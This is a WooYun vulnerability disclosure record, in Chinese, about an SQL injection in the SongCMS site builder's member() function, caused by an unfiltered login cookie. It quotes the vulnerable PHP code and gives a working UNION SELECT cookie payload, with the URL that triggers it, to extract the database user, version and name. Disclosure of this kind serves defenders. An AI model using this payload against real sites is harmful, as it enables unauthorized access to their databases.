{"id": 50288, "wybug_id": "wooyun-2014-078258", "wybug_title": "songcms建站 SQL注入", "wybug_corp": "中山市凯格网络科技有限公司", "wybug_author": "路人甲", "wybug_date": "2014-10-15 15:31", "wybug_open_date": "2014-11-29 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 全局变量$_COOKIE未经过滤带入SQL语句导致SQL注入 详细说明：  文件 ./class/user.class.php\npublic function member(){\t\tglobal $_COOKIE,$Lang,$Warning;\t\t$Origin = $Lang == 1 ? './?flogin' : \"./?flogin/l{$Lang}\";\t\tif(empty($_COOKIE['User']['Name']) || $_COOKIE['isLogin'] != 'songcms'){    \t\t\tMsgBox(1,$Warning[19],$Origin); \t\t} else {\t\t\t$SQL = \"SELECT * FROM `{$this->dbprefix}user` WHERE `UserName` = '{$_COOKIE['User']['Name']}'\"; //此处$_COOKIE['User']['Name']未过滤直接带入sql语句，满足else 条件即可造成注入\t\t\t$result = $this->SelectSQL($SQL,1);\t\t\tif(count($result) == 1){\t\t\t\treturn array_shift($result);\t\t\t\t} elseif(UC_ENABLED == 1) { \t\t\t\tinclude_once($this->UC_dir.'uc_client/client.php');\t\t\t\tlist($uid,$username,$email) = uc_get_user($_COOKIE['User']['Name'],0);\t\t\t\tif($uid > 0){\t\t\t\t\t$SQL = \"INSERT INTO `{$this->dbprefix}user` (`UserName`,`UserEmail`,`UserLogin`,`UserLoginIP`,`UserLoginTime`,`UserRegIP`,`UserRegTime`,`UserAudit`)\";\t\t\t\t\t$SQL .= \"VALUES ('{$username}','{$email}','0','\" . $_SERVER['REMOTE_ADDR'] . \"',NOW(),'\" . $_SERVER['REMOTE_ADDR'] . \"',NOW(),'{$this->Audit}');\";\t\t\t\t\t$oid = $this->ExecuteSQL($SQL,1);\t\t\t\t\t$SQL = \"SELECT * FROM `{$this->dbprefix}user` WHERE `ID` = '{$oid}'\";\t\t\t\t\t$result = $this->SelectSQL($SQL,1);\t\t\t\t\t\treturn array_shift($result);\t\t\t\t\t\t\t\t\tif(count($result) == 1){\t\t\t\t\t\treturn array_shift($result);\t\t\t\t\t} else {\t\t\t\t\t\tMsgBox(1,'Error:55140',$Origin);\t\t\t\t\t\t}\t\t\t\t}\t\t\t} else {\t\t\t\tMsgBox(1,$Warning[19],$Origin); \t\t\t}\t\t}\t}\n本地构造 cookie 满足else条件12345678' and 1=2 union select 1,concat_ws('|',user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 limit 1#\n\n\n\n然后访问 /songcms/?fprofile/m1\n\n   漏洞证明：  \n\n   修复方案：  过滤参数！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}